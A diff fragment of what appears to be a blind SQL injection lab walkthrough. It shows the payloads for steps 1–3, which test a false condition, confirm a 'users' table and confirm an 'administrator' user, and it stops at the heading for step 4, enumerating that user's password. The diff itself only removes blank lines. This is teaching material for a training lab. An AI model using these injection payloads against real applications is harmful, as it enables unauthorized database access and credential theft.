@@ -23,20 +23,17 @@ To solve the lab, log in as the administrator user.
 ' AND 1=2--
 ```
 
-
 2/ Confirm that we have a "users" table
 
 ```sql
 ' AND (SELECT 'x' FROM users LIMIT 1)='x'--
 ```
 
-
 3/ Confirm that username "administrator" exists in the "users" table
 
 ```sql
 ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
 ```
-
 
 4/ Enumerate the password of the "administrator" user
 
